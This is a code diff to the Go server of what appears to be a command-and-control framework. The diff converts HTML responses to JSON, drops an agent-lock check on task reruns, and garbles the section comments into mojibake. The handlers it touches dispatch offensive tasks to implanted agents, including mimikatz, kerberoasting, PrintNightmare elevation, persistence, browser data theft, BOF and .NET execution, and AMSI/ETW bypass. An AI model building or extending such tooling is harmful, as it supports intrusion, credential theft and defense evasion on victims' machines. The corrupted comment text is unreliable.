@@ -1,7 +1,6 @@
-package server
+﻿package server
 
 import (
-	"bytes"
 	"encoding/base64"
 	"fmt"
 	"io"
@@ -34,7 +33,7 @@ func (s *Server) handleShellPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "shell_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 func (s *Server) handleSendCommand(c *gin.Context) {
@@ -70,15 +69,7 @@ func (s *Server) handleGetAgentTasks(c *gin.Context) {
 		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
 		Order("created_at desc").Limit(AgentTasksLimit).Find(&tasks)
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agent_tasks_list", gin.H{"Tasks": tasks}); err != nil {
-		slog.Error("Failed to render tasks", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	c.String(http.StatusOK, contentBuf.String())
+	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
 }
 
 func (s *Server) handleGetTaskStatus(c *gin.Context) {
@@ -594,13 +585,6 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot rerun tasks"})
 		return
 	}
-	user, _ := c.Get("user")
-	username := fmt.Sprintf("%v", user)
-	if holder, ok := s.checkAgentLock(agentID, username); !ok {
-		c.JSON(http.StatusLocked, gin.H{"error": fmt.Sprintf("agent locked by %s", holder), "locked_by": holder})
-		return
-	}
-
 	if _, ok := s.getAgentOrFail(c, agentID); !ok {
 		return
 	}
@@ -643,7 +627,7 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 	s.dispatchTask(c, newTask, "rerun_"+original.Type, fmt.Sprintf("rerun of #%d", taskID))
 }
 
-// ── execute-assembly: Upload and execute .NET assembly ─────────────────────
+// 鈹€鈹€ execute-assembly: Upload and execute .NET assembly 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleExecuteAssembly(c *gin.Context) {
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -665,7 +649,7 @@ func (s *Server) handleExecuteAssembly(c *gin.Context) {
 	s.dispatchTask(c, task, "execute_assembly", filename)
 }
 
-// ── kerberoast: Request TGS hashes for all SPNs ────────────────────────────
+// 鈹€鈹€ kerberoast: Request TGS hashes for all SPNs 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleKerberoast(c *gin.Context) {
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -681,7 +665,7 @@ func (s *Server) handleKerberoast(c *gin.Context) {
 	s.dispatchTask(c, task, "kerberoast", "")
 }
 
-// ── mimikatz: Run mimikatz command ─────────────────────────────────────────
+// 鈹€鈹€ mimikatz: Run mimikatz command 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleMimikatz(c *gin.Context) {
 	id := c.Param("id")
 	command := c.PostForm("command")
@@ -701,7 +685,7 @@ func (s *Server) handleMimikatz(c *gin.Context) {
 	s.dispatchTask(c, task, "mimikatz", command)
 }
 
-// ── elevate_printnightmare: PrintNightmare exploit ─────────────────────────
+// 鈹€鈹€ elevate_printnightmare: PrintNightmare exploit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
 	id := c.Param("id")
 	dllPath := c.PostForm("dll_path")
@@ -722,7 +706,7 @@ func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
 	s.dispatchTask(c, task, "elevate_printnightmare", dllPath)
 }
 
-// ── Persistence Toolkit ──────────────────────────────────────────────────
+// 鈹€鈹€ Persistence Toolkit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handlePersistence(c *gin.Context) {
 	id := c.Param("id")
 	action := c.PostForm("action")
@@ -779,7 +763,7 @@ func (s *Server) handlePersistence(c *gin.Context) {
 	}
 }
 
-// ── PowerPick: Execute PowerShell script in-process ───────────────────────
+// 鈹€鈹€ PowerPick: Execute PowerShell script in-process 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handlePowerPick(c *gin.Context) {
 	id := c.Param("id")
 	script := c.PostForm("script")
@@ -807,7 +791,7 @@ func (s *Server) handlePowerPick(c *gin.Context) {
 	s.dispatchTask(c, task, "powerpick", fmt.Sprintf("PowerPick (%d bytes)", len(script)))
 }
 
-// ── Browser Data Theft ────────────────────────────────────────────────────
+// 鈹€鈹€ Browser Data Theft 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleBrowserSteal(c *gin.Context) {
 	id := c.Param("id")
 	browser := c.PostForm("browser")
@@ -828,7 +812,7 @@ func (s *Server) handleBrowserSteal(c *gin.Context) {
 	s.dispatchTask(c, task, "browser_steal", "Browser steal: "+browser)
 }
 
-// ── BOF: Upload and execute Beacon Object File ────────────────────────────
+// 鈹€鈹€ BOF: Upload and execute Beacon Object File 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleNetCommand(c *gin.Context) {
 	id := c.Param("id")
 	command := c.PostForm("command")
@@ -872,7 +856,7 @@ func (s *Server) handleBOF(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", filename)})
 }
 
-// ── AMSI/ETW Bypass ──────────────────────────────────────────────────────────
+// 鈹€鈹€ AMSI/ETW Bypass 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 func (s *Server) handleAMSIByPass(c *gin.Context) {
 	id := c.Param("id")
@@ -906,7 +890,7 @@ func (s *Server) handleETWByPass(c *gin.Context) {
 	s.dispatchTask(c, task, "etw_bypass", "ETW Bypass")
 }
 
-// ── Self-Update ───────────────────────────────────────────────────────────────
+// 鈹€鈹€ Self-Update 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 func (s *Server) handleSelfUpdate(c *gin.Context) {
 	id := c.Param("id")
@@ -981,3 +965,4 @@ func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b
 	ok = true
 	return
 }
+
